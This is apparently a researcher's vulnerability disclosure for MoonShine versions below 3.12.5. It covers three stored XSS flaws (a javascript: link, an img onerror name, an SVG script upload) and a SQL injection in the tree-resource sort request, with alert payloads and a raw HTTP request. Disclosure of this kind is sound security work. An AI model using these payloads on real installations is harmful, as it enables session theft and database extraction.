# MoonShine Software Vulnerability Disclosure
Author: Giacomo Lenzini - GiacoLenzo2109
## CVE-2025-51487 - Stored XSS
### Description
A Stored Cross-Site Scripting (XSS) vulnerability exists in MoonShine version < 3.12.5, allowing remote attackers to store and execute arbitrary JavaScript in the browser of a user by including a payload using "javascript:", instead of the expected HTTPS protocol, in the CutCode *Link* parameter when creating/updating a new Article.
### CVSS 3.1 - 4.5 Medium
CVSS:3.0/AV:N/AC:L/PR:H/UI:R/S:U/C:H/I:N/A:N
### PoC - Proof of Concept
The XSS is related to the creation of a new article:  
1. Under the sidebar: *Blog -> Articles*

2. Under *Link -> CutCode* insert the following payload under: `javascript:alert("XSS")`
![/images/CVE-2025-51487_1.png](/images/CVE-2025-51487_1.png)


3. Complete all other fields and save

4. Load all articles and check for your last article saved. Under the link field you will see your payload. Click on it, a popup will be opened showing the message "XSS"
![/images/CVE-2025-51487_2.png](/images/CVE-2025-51487_2.png)
![/images/CVE-2025-51487_3.png](/images/CVE-2025-51487_3.png)

## CVE-2025-51488 - Stored XSS
### Description
A Stored Cross-Site Scripting (XSS) vulnerability exists in MoonShine version < 3.12.4, allowing remote attackers to store and execute arbitrary JavaScript in the browser of a user by including a malicious payload in the *Name* parameter when creating a new Admin.
### CVSS 3.1 - 4.9 Medium
CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N
### PoC - Proof of Concept
The issue is related to the function to add a new Admin.  

1. Under the Sidebar "System" tab: *Admins -> Create*

2. Insert the following payload under the *Name* input field: `<img src=x onerror=alert("XSS")>`
![/images/CVE-2025-51488_1.png](/images/CVE-2025-51488_1.png)

3. Save

4. Under the sidebar select *Blog -> Articles*: now a popup will be opened showing the message "XSS"  
![/images/CVE-2025-51488_2.png](/images/CVE-2025-51488_2.png)

## CVE-2025-51489 - Reflected XSS via Unrestriced File Upload
### Description
A Stored Cross-Site Scripting (XSS) vulnerability exists in MoonShine version < 3.12.5, allowing remote attackers to upload a malicious SVG file in *Files -> Thumbnail* when creating/updating an Article and correctly execute arbitrary JavaScript in the victim's browser when the file link is opened by the victim.
### CVSS 3.1 - 4.5 Medium
CVSS:3.0/AV:N/AC:L/PR:H/UI:R/S:U/C:H/I:N/A:N
### PoC - Proof of Concept
When creating a new Article (*Blog -> Articles*), an attacker could upload the following SVG under *Files -> Thumbnail* field.
```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(255,0,0);stroke-width:3;stroke:rgb(0,0,0)" />
   <script type="text/javascript">
      alert("XSS!");
   </script>
</svg>
```
![/images/CVE-2025-51489_1.png](/images/CVE-2025-51489_1.png)
![/images/CVE-2025-51489_2.png](/images/CVE-2025-51489_2.png)


## CVE-2025-51510 - SQL Injection
### Description
MoonShine was discovered to contain a SQL injection vulnerability via the Data parameter under the Blog module when using the moonshine-tree-resource component. An example of the use of this vulnerable component can be found under the public MoonShine Software demo based on MoonShine Software 3.12.5 (https://github.com/moonshine-software/demo-project - commit 72a1d80bf23de6c3457205630eb25409432bdbe0).

The vulnerable component is the following https://github.com/lee-to/moonshine-tree-resource (version < 2.0.2).
### CVSS 3.1 - 4.9 Medium
CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N
### PoC - Proof of Concept
To correctly intercept the vulnerable request, change the position of a category (for example, the one highlighted in blue) by moving it up/down.
![/images/CVE-2025-51510.png](/images/CVE-2025-51510.png)

Vulnerable SQLi request, injecting a payload inside the *data* request field that shows the database version.
```
POST /admin/category-resource/sortable HTTP/1.1
Host: localhost
Content-Length: 431
sec-ch-ua-platform: "macOS"
X-XSRF-TOKEN: <REPLACE>
sec-ch-ua: "Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"
sec-ch-ua-mobile: ?0
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryuLTeqJXF3L06Er3R
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/admin/resource/category-resource/category-index-page
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
Cookie: XSRF-TOKEN=<REPLACE>; laravel_session=<REPLACE>

------WebKitFormBoundaryuLTeqJXF3L06Er3R
Content-Disposition: form-data; name="id"

1
------WebKitFormBoundaryuLTeqJXF3L06Er3R
Content-Disposition: form-data; name="parent"


------WebKitFormBoundaryuLTeqJXF3L06Er3R
Content-Disposition: form-data; name="index"

1
------WebKitFormBoundaryuLTeqJXF3L06Er3R
Content-Disposition: form-data; name="data"

(SELECT @@version)
------WebKitFormBoundaryuLTeqJXF3L06Er3R--
```

Here an example of the dumped db version:
![/images/CVE-2025-51510_1.png](/images/CVE-2025-51510_1.png)

Using the attached Python script (CVE-2025-51510.py), it was possible to extract Admin hash from *moonshine_users* table.

P.S. Replace the cookies within the script with valid ones.

The following image shows the Admin hash correctly dumped (from moonshine_users table) character by character:
![/images/CVE-2025-51510_2.png](/images/CVE-2025-51510_2.png)

